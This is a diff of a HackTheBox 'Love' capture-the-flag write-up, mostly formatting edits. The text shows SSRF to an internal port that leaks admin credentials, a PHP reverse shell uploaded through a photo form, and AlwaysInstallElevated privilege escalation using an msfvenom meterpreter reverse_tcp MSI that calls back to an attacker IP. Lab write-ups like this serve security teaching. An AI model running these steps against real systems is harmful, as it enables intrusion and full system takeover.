@@ -1,17 +1,28 @@
 ---
+weight: 1
 title: "HackTheBox - Love Writeup"
 date: 2021-08-25
 draft: false
-tags: ["ssrf", "upload-vuln", "AlwaysInstallElevated", "winpeas", "msfvenom"]
-htb: "HacktheBox"
-windows: "Windows"
+author: "SH∆FIQ ∆IM∆N"
+authorLink: "https://shafiqaiman.com"
+images: []
+resources:
+- name: "featured-image"
+  src: "featured.png"
+
+tags: ["ssrf", "upload-vuln", "AlwaysInstallElevated", "winpeas", "msfvenom", "gobuster", "msi-file"]
+categories: ["HacktheBox"]
+
+lightgallery: true
+toc:
+  auto: false
 ---
 
 ## Enumeration
 
 - scan top 1000 ports
 
-```sql
+```bash
 nmap -sC -sV -oN nmap/initial 10.10.10.239
 ```
 
@@ -110,7 +121,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 - All ports scan
 
-```sql
+```bash
 nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.239
 ```
 
@@ -243,7 +254,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ### WebPage [love.htb]
 - Let's take look at `love.htb`
 
-![1](love.png)
+![login page](love.png "login page")
 
 - It's just a login page.
 - We need credentials to access it
@@ -257,7 +268,7 @@ gobuster dir -u http://love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-sma
 
 - the result
 
-![1](gobuster.png)
+![gobuster](gobuster.png "gobuster")
 
 - I'll try my best to enumerate it.
 - unfortunately, I can't find anything yet.
@@ -265,40 +276,39 @@ gobuster dir -u http://love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-sma
 
 ### WebPage [staging.love.htb]
 
-![1](staging.png)
+![staging.love.htb webpage](staging.png "staging.love.htb webpage")
 
 - Well, this is just `free file scanner` app.
 - I try to `sign up` but it didn't work.
 - However, I found the `input form` in the `demo tab` (at the top navbar)
 
-![1](demo.png)
+![input form](demo.png "input form")
 
 - It scans the file by entering the URL
 - Now, I'm gonna start the python web server and make a request
 
-![1](http_server.png)
+![python3 http server](http_server.png "python3 http server")
 
 - then, put the URL.
 - we've got the response.
 
-![1](ffs-404.png)
+![404 response](ffs-404.png "404 response")
 
 ### SSRF
 - Server Side Request Forgery [SSRF]
 
-> The attacker can supply or modify a URL which the code running on the server will read or submit data, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like HTTP enabled databases or perform post requests towards internal services which are not intended to be exposed.
-- Source
-	- [OWASP - Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
-	- [PortSwigger - Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
-
-<br>
+{{< admonition tip "Description" >}}
+The attacker can supply or modify a URL which the code running on the server will read or submit data, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like HTTP enabled databases or perform post requests towards internal services which are not intended to be exposed.
+- [OWASP - Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
+- [PortSwigger - Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
+{{< /admonition >}}
 
 - Remember the Nmap scan earlier. 
 - we've found port `5000` open and running `Apache` but we can't reach it.
 - So, I'm gonna make the server do request on itself by putting `http://127.0.0.1:5000`
 - the result
 
-![1](5000.png)
+![found admin credential](5000.png "found admin credential")
 
 - cool! we've got the `admin credentials`
 - gobuster scan earlier found the `/admin/` directory
@@ -307,13 +317,13 @@ gobuster dir -u http://love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-sma
 ## Foothold/Gaining Access
 
 ### WebPage [love.htb/admin]
-![1](admin_webpage.png)
+![admin webpage](admin_webpage.png "admin webpage")
 
 - We've got access to the admin panel
 - Let's enumerate the admin panel. 
 - I've found the `upload section` on the `admin update profile`
 
-![1](update.png)
+![upload button](update.png "upload button")
 
 - Let's upload the `reverse shell`
 - navigate to `love.htb/images/<filename>` to activate the reverse shell
@@ -323,16 +333,16 @@ gobuster dir -u http://love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-sma
 - we've got the shell
 - Let's get the `user flag`
 
-![1](phoebe.png)
+![shell as phoebe](phoebe.png "shell as phoebe")
 
 ### User Flag
-![1](user.png)
+![user flag](user.png "user flag")
 
 ### WinPEAS
 - Now, I'm gonna upload the `WinPEAS`
 - Then, run the binary
 
-![1](winpeas.png)
+![winPEAS](winpeas.png "winPEAS")
 
 - To be honest, I can't find anything at all. 
 - Then, I just keep opening the link that has `red color`
@@ -340,7 +350,7 @@ gobuster dir -u http://love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-sma
 
 ## Privilege Escalation
 
-![1](AlwaysInstallElevated.png)
+![winPEAS output - AlwaysInstallElevated](AlwaysInstallElevated.png "winPEAS output - AlwaysInstallElevated")
 
 > <font color="yellow">Checking AlwaysInstallElevated</font>
 
@@ -351,7 +361,10 @@ gobuster dir -u http://love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-sma
 	- [Microsoft - AlwaysInstallElevated](https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)
 
 ### AlwaysInstallElevated
-> As we all are aware that Windows OS comes installed with a Windows Installer engine which is used by <font color="yellow">MSI packages</font> for the installation of applications. These MSI packages can be installed with elevated privileges for non-admin users
+{{< admonition tip "Description" >}}
+As we all are aware that Windows OS comes installed with a Windows Installer engine which is used by <font color="yellow">MSI packages</font> for the installation of applications. These MSI packages can be installed with elevated privileges for non-admin users
+{{< /admonition >}}
+
 - How, we wanna know if this `AlwaysInstallElevated` can use?
 	- If these 2 registers are enable (value is 0x1)
 	- then, users of any privilege can install (execute) `*.msi` files as `NT AUTHORITY/SYSTEM`
@@ -372,7 +385,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 
 - the result
 
-![1](register2.png)
+![attack vector](register2.png "attack vector")
 
 - So, the value of those `2 registers are in facts 0x1`
 - Now, we know we can exploit it. 
@@ -391,11 +404,11 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.14 lport=9902 -f msi 
 - Before we can execute it.
 - We need to set up the `"listener"` for our meterpreter reverse shell
 
-![1](multi-handler.png)
+![setup listener](multi-handler.png "setup listener")
 
 ### Execute the MSI file
 - Let's execute those files
-```bash
+```powershell
 msiexec /quiet /qn /i lol.msi
 # flags explain
 /quiet = Suppress any messages to the user during installation
@@ -405,13 +418,13 @@ msiexec /quiet /qn /i lol.msi
 
 - the result
 
-![1](msi-exec.png)
+![shell as nt authority\system](msi-exec.png "shell as nt authority\system")
 
 - we've got the shell and become `NT AUTHORITY/SYSTEM`
 
 ### Administrator Flag
 
-![1](administrator.png)
+![root flag](administrator.png "root flag")
 
 ## Conclusion
 I've learned a lot today. First, enumerate is the key. YES! it is important. I always heard SSRF and this machine introduces it to me and guess what. I'm so phreaking excited. Also, always ask yourself it is your web app is secure because like we know this machine web app doesn't have any filter at the upload form and it's even allowed php file to be uploaded at the photo upload form. Make sure to configure your machine properly.
